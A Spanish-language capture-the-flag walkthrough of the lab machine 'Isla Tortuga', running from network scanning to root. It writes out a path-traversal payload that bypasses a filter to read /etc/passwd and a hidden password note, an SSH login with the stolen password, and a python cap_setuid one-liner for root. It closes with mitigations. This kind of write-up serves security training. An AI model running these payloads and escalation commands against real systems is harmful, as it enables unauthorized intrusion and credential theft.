Isla Tortuga

Guía paso a paso, de reconocimiento a root. Cada comando tiene su botón de copiar.

Objetivo: 192.168.100.76 SO: Debian 12 Puertos: 22, 80
⚓ Aviso: máquina de laboratorio propia y aislada. Usa estas técnicas solo sobre sistemas para los que tengas autorización explícita.
preparación
# Guarda la IP objetivo en una variable
export T=192.168.100.76
mkdir -p ~/tortuga/recon && cd ~/tortuga/recon
1

Descubrimiento de red

Localizar la máquina objetivo en el segmento de red.

nmap · host discovery
nmap -sn 192.168.100.0/24 -oN hosts.txt
sudo arp-scan -I eth0 --localnet
2

Escaneo de puertos y servicios

Enumerar puertos, versiones y SO.

nmap
nmap -p- --open -sS --min-rate 3000 -n -Pn $T -oN allports.txt
sudo nmap -p22,80 -sCV -O -n -Pn $T -oN services.txt
resultado
22/tcp open ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open http    Apache httpd 2.4.62 ((Debian))  -> "Isla Tortuga"
3

Footprinting web

Revisar la web a mano y con herramientas.

enumeración web
curl -i http://$T/
whatweb -a 3 http://$T
gobuster dir -u http://$T -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 50
curl -s http://$T/mapa.php
curl -s http://$T/tripulacion.php

Pistas: mapa.php menciona a grumete y una "nota oculta en tu camarote"; tripulacion.php esconde: "el viejo truco de las rutas dobles siempre funciona" → path traversal con filtro evadible (....//).

4

Descubrir el parámetro LFI

Encontrar el parámetro vulnerable y el payload de evasión.

ffuf · fuzzing de parámetros
ffuf -u "http://$T/mapa.php?FUZZ=....//....//....//....//etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "root:x:0:0" -t 50
# ==> parámetro: filename

Truco de "rutas dobles": el código hace str_replace('../','',$f). ....// contiene un ../ en medio; al borrarlo queda ../. Filtro evadido.

5

Explotar el LFI

Leer ficheros del sistema y enumerar usuarios.

LFI · /etc/passwd
curl -s "http://$T/mapa.php?filename=....//....//....//....//etc/passwd"
usuarios con shell
capitan:x:1001:1001::/home/capitan:/bin/bash
grumete:x:1002:1002::/home/grumete:/bin/bash
6

Leer la nota oculta del grumete

"nota oculta en tu camarote" = dotfile .nota.txt.

LFI · dotfile
curl -s "http://$T/mapa.php?filename=....//....//....//....//home/grumete/.nota.txt"
contenido
La puerta de la cámara del timón está asegurada con la contraseña:
    "mar_de_fuego123"
— El Capitán

Credencial en texto plano. La escribe "El Capitán" → se prueba contra el usuario capitan.

7

Acceso inicial por SSH (capitan)

Primera shell con la contraseña robada.

ssh · foothold
ssh capitan@$T
# Contraseña: mar_de_fuego123
capitan@TheHackersLabs-Tortuga:~$ id
uid=1001(capitan) gid=1001(capitan)
8

Escalada a root (Linux Capabilities)

Buscar capabilities peligrosas y abusar de ellas.

getcap
/usr/sbin/getcap -r / 2>/dev/null
# Resultado: /usr/bin/python3.11 cap_setuid=ep
GTFOBins · python
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'
root@TheHackersLabs-Tortuga:~# id
uid=0(root)

¿Por qué? cap_setuid=ep da a python la syscall setuid(2) a nivel de fichero, sin SUID ni sudo. Ref: GTFOBins · python.

Mitigaciones

  • LFI: lista blanca + basename(); nunca sanear con un simple str_replace.
  • Credenciales: no guardar contraseñas en notas/ficheros de texto.
  • Capability: getcap -r / y quitar las innecesarias: setcap -r /usr/bin/python3.11.
  • SSH: contraseñas robustas + clave pública (PasswordAuthentication no).
